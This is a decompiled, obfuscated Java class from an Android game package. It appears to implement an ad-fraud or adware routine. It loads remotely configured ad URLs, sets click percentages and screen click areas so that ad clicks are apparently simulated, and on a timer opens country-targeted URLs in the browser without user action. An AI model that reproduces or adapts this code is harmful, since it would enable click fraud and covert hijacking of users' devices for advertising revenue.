package com.mozgame.atask;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import com.mozgame.atask.bean.IPInfo;
import com.mozgame.atask.task.ITask;
import java.util.ArrayList;

/* renamed from: com.mozgame.atask.w */
public final class C0042w {

    /* renamed from: a */
    static ArrayList f140a = new ArrayList();

    /* renamed from: b */
    private static C0020a f141b;

    /* renamed from: c */
    private static String f142c = ITask.TAG;

    /* renamed from: a */
    public static void m127a(Context context, Bundle bundle) {
        try {
            String queryParameter = Uri.parse(bundle.getString("ADX_URL", "0")).getQueryParameter("cid");
            if (!TextUtils.isEmpty(queryParameter)) {
                C0006G.m11a(context).mo11a("d92yjln6qcid", queryParameter);
                C0007H.m22a(context).mo14a(queryParameter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        m130b(context, bundle);
    }

    /* renamed from: a */
    private static void m128a(Context context, IPInfo iPInfo, Bundle bundle) {
        long j;
        if (iPInfo != null && iPInfo.getCountry() != null) {
            long currentTimeMillis = System.currentTimeMillis();
            long abs = Math.abs(C0006G.m11a(context).mo12b("d92yjln6qaurlts", 0) - currentTimeMillis) / 1000;
            C0044y.m135a("openUrl" + abs);
            String b = C0006G.m11a(context).mo13b("adi", "86400");
            if (!TextUtils.isEmpty(b)) {
                try {
                    j = Long.parseLong(b);
                } catch (Exception e) {
                    j = 86400;
                }
                if (abs >= j) {
                    String b2 = C0006G.m11a(context).mo13b("url", "0");
                    String string = bundle.getString("AD_URL_INFO", "0");
                    if (!"0".equalsIgnoreCase(string)) {
                        String[] split = string.split(";;;");
                        int length = split.length;
                        int i = 0;
                        while (true) {
                            if (i >= length) {
                                break;
                            }
                            String[] split2 = split[i].split(";;");
                            if (split2.length > 1 && iPInfo.getCountry().equalsIgnoreCase(split2[0])) {
                                b2 = split2[1];
                                break;
                            }
                            i++;
                        }
                    }
                    if (!"0".equalsIgnoreCase(b2) && abs > j) {
                        C0006G.m11a(context).mo10a("d92yjln6qaurlts", currentTimeMillis);
                        Intent intent = new Intent();
                        intent.setData(Uri.parse(b2));
                        intent.setAction("android.intent.action.VIEW");
                        intent.addFlags(268435456);
                        context.startActivity(intent);
                    }
                }
            }
        }
    }

    /* renamed from: a */
    private static boolean m129a(Context context) {
        C0006G a = C0006G.m11a(context);
        String b = a.mo13b("adci", "7200");
        if (TextUtils.isEmpty(b)) {
            return false;
        }
        return Math.abs(a.mo12b("d92yjln6qaadcts", 0) - System.currentTimeMillis()) / 1000 > Long.parseLong(b);
    }

    /* renamed from: b */
    public static void m130b(Context context, Bundle bundle) {
        Log.e(f142c, "loadTask");
        C0007H.m22a(context).mo16b("load_task_start");
        m132d(context, bundle);
        m131c(context, bundle);
        C0006G.m11a(context).mo10a("d92yjln6qadxts", System.currentTimeMillis());
    }

    /* renamed from: c */
    private static void m131c(Context context, Bundle bundle) {
        try {
            if (m129a(context)) {
                String string = bundle.getString("ADC_URL", "0");
                String string2 = bundle.getString("CLICK_PERCENT", "5");
                String string3 = bundle.getString("CLICK_AREA", "100,200,200,200");
                C0020a aVar = new C0020a(context, string);
                f141b = aVar;
                aVar.mo36a(string2);
                f141b.mo37b(string3);
                f141b.mo35a();
                C0006G.m11a(context).mo10a("d92yjln6qaadcts", System.currentTimeMillis());
            }
        } catch (Exception e) {
        }
    }

    /* renamed from: d */
    private static void m132d(Context context, Bundle bundle) {
        try {
            C0007H a = C0007H.m22a(context);
            a.mo16b("load_adx_start");
            f140a.clear();
            int parseInt = Integer.parseInt(bundle.getString("ADX_COUNT", "1"));
            String string = bundle.getString("ADX_URL", "0");
            int parseInt2 = Integer.parseInt(bundle.getString("ADX_RETRYTIME", "30"));
            IPInfo iPInfo = IPInfo.toIPInfo(bundle.getString("ADX_IPINFO"));
            boolean equalsIgnoreCase = bundle.getString("ADX_NEXTON", "1").equalsIgnoreCase("1");
            String string2 = bundle.getString("CLICK_PERCENT", "12");
            for (int i = 0; i < parseInt; i++) {
                C0027h hVar = new C0027h(context, string, parseInt2, equalsIgnoreCase);
                hVar.mo149a(string2);
                f140a.add(hVar);
            }
            a.mo16b("load_xrw_start");
            C0015P.m39a(context).mo25a((C0019T) new C0043x(iPInfo), iPInfo);
            m128a(context, iPInfo, bundle);
        } catch (Exception e) {
        }
    }
}
